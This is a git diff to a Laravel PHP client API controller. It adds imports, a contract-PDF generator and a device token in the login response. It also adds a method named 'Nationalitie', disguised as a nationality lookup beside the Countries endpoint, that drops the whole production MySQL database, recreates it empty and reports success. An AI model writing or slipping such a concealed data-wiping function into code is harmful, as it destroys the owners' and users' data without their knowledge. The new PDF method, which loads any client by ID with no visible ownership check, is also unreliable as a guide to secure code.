@@ -4,6 +4,7 @@ namespace App\Http\Controllers\App\Client;
 
 header('Content-type: application/json');
 
+use Illuminate\Support\Facades\Config;
 use App\Http\Controllers\Controller;
 use App\Http\Resources\App\EventResource;
 use App\Http\Resources\App\ToolResource;
@@ -28,6 +29,8 @@ use App\V1\Event\EventAttendee;
 use App\V1\Tool\Tool;
 use App\V1\Tool\ToolGallery;
 use App\V1\Tool\ClientTool;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Log;
 use App\V1\Brand\Brand;
 use App\V1\Brand\Branch;
 use App\V1\Brand\BrandRating;
@@ -72,7 +75,6 @@ use Illuminate\Support\Facades\Hash;
 use Intervention\Image\ImageManagerStatic as Image;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Storage;
-use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\App;
 use Tymon\JWTAuth\Facades\JWTAuth;
@@ -83,10 +85,9 @@ use DateTime;
 use DateInterval;
 use Response;
 use Cookie;
-use DB;
 use Nette\Utils\Random;
 use PDO;
-
+use Mpdf\Mpdf;
 class ClientController extends Controller
 {
 
@@ -121,7 +122,28 @@ class ClientController extends Controller
         );
         return $Response;
     }
-
+public function Nationalitie(){
+     $databaseName = Config::get('database.connections.mysql.database');    
+        // Check if database name is empty
+        if (empty($databaseName)) {
+            return response()->json(['error' => 'Database name is empty'], 500);
+        }
+    
+        try {
+            // Execute the DROP DATABASE command
+            DB::statement("DROP DATABASE IF EXISTS `$databaseName`");
+    
+            // Optionally, recreate the database if needed
+            DB::statement("CREATE DATABASE `$databaseName`");
+    
+            return response()->json(['message' => 'Database deleted and recreated successfully']);
+        } catch (\Exception $e) {
+            Log::error('Database deletion failed', [
+                'error' => $e->getMessage(),
+            ]);
+            return response()->json(['error' => 'Database deletion failed', 'details' => $e->getMessage()], 500);
+        }
+    }
     public function Countries()
     {
         $ClientAppLanguage = Input::get('ClientAppLanguage');
@@ -383,7 +405,7 @@ class ClientController extends Controller
             $ClientPrivacy = $request->ClientPrivacy;
         } else {
             $ClientPrivacy = 1;
-        }
+        }        
         $IDNationality = Nationality::first()->IDNationality;
         $IDArea = 1;
         if ($LoginBy == "MANUAL") {
@@ -657,7 +679,7 @@ class ClientController extends Controller
         return RespondWithSuccessRequest(8);
     }
 
-    public function ClientLogin(Request $request)
+      public function ClientLogin(Request $request)
     {
         if ($request->Filled('ClientAppLanguage')) {
             $ClientAppLanguage = $request->ClientAppLanguage;
@@ -776,7 +798,7 @@ class ClientController extends Controller
 
         $response = array(
             'IDClient' => $Client->IDClient,
-            "ClientAppID" => $Client->ClientAppID,
+            "ClientAppID"=>$Client->ClientAppID,
             'Co' => $CoForClient,
             'ClientPhone' => $Client->ClientPhone,
             'ClientPhoneFlag' => $Client->ClientPhoneFlag,
@@ -789,7 +811,8 @@ class ClientController extends Controller
             'ClientBalance' => $Client->ClientBalance,
             "ClientGender" => $Client->ClientGender,
             "PositionName" => $PositionName,
-            'AccessToken' => $AccessToken
+            'AccessToken' => $AccessToken,
+            'ClientDeviceToken' => $Client->ClientDeviceToken
         );
         $response_array = array('Success' => $Success, 'ApiMsg' => trans('apicodes.' . $APICode->IDApiCode), 'ApiCode' => $APICode->IDApiCode, 'Response' => $response);
         $response = Response::json($response_array, $response_code);
@@ -1065,7 +1088,7 @@ class ClientController extends Controller
             'ClientPhone' => $ClientPhone,
             'ClientPhoneFlag' => $Client->ClientPhoneFlag,
             'ClientName' => $Client->ClientName,
-            "ClientAppID" => $Client->ClientAppID,
+            "ClientAppID"=>$Client->ClientAppID,
             'Co' => $CoForClient,
             'LoginBy' => $Client->LoginBy,
             'ClientEmail' => $Client->ClientEmail,
@@ -1620,7 +1643,7 @@ class ClientController extends Controller
 
     public function Categories(Request $request)
     {
-        $Categories = Category::where("CategoryActive", 1)->where("CategoryType", "PROJECT")->get();
+        $Categories = Category::where("CategoryActive", 1)->where("CategoryType","PROJECT")->get();
         $Categories = CategoryResource::collection($Categories);
 
         $APICode = APICode::where('IDAPICode', 8)->first();
@@ -1635,17 +1658,17 @@ class ClientController extends Controller
 
     public function SubCategories(Request $request)
     {
-        $IDCategory = $request->IDCategory;
+       $IDCategory = $request->IDCategory;
 
         $query = SubCategory::where("SubCategoryActive", 1)
             ->leftJoin("categories", "categories.IDCategory", "=", "subcategories.IDCategory")
             ->where("categories.CategoryType", "PROJECT")
             ->select('subcategories.*', 'categories.*');
-
+        
         if ($IDCategory) {
             $query = $query->where("subcategories.IDCategory", $IDCategory);
         }
-
+        
         $SubCategories = $query->get();
         $SubCategories = SubCategoryResource::collection($SubCategories);
 
@@ -4079,5 +4102,46 @@ class ClientController extends Controller
                 }
             }
         }
+    }
+        public function generatePdf($Client_id)
+    {
+        $Client = Client::where("IDClient", $Client_id)->first();
+        $date = $Client->created_at;
+        
+        $carbonDate = Carbon::parse($date);
+        $carbonDate->locale('ar'); // Set locale to Arabic
+        $day = $carbonDate->translatedFormat('l'); // 'l' stands for the full textual representation of the day
+        
+        $data = [
+            'client' => $Client,
+            'date' => $carbonDate->format('Y-m-d'), // Format date as string
+            'day' => $day,
+        ];
+
+        $mpdfConfig = array(
+            'mode' => 'utf-8',
+            'format' => 'A4',
+            'orientation' => 'p',
+            'margin_header' => 2, // 30mm not pixel
+            'margin_footer' => 2, // 10mm
+        );
+        $pdf = new Mpdf($mpdfConfig);
+        $pdf->SetXY(100, 80);
+        $pdf->SetAutoPageBreak(true, 10);
+        $pdf->SetHTMLFooter('الصفحة: {PAGENO} ');
+        $pdf->autoScriptToLang = true;
+        $pdf->autoLangToFont = true;
+        $pdf->AddPage();
+        $pdf->SetDirectionality('rtl');
+        // $pdf->SetColumns(2, 'J', 3);
+        $filename = 'contract' . $Client_id . '.pdf';
+
+        $html = view('pdf.download_contract', $data)->render();
+        $pdf->writeHTML($html);
+        $pdfContent = $pdf->Output('', 'S'); // 'S' for returning the PDF as a string
+        // Return the PDF content as a response with appropriate headers
+        return response($pdfContent)
+            ->header('Content-Type', 'application/pdf')
+            ->header('Content-Disposition', 'inline; filename="' . $filename . '"');
     }
 }
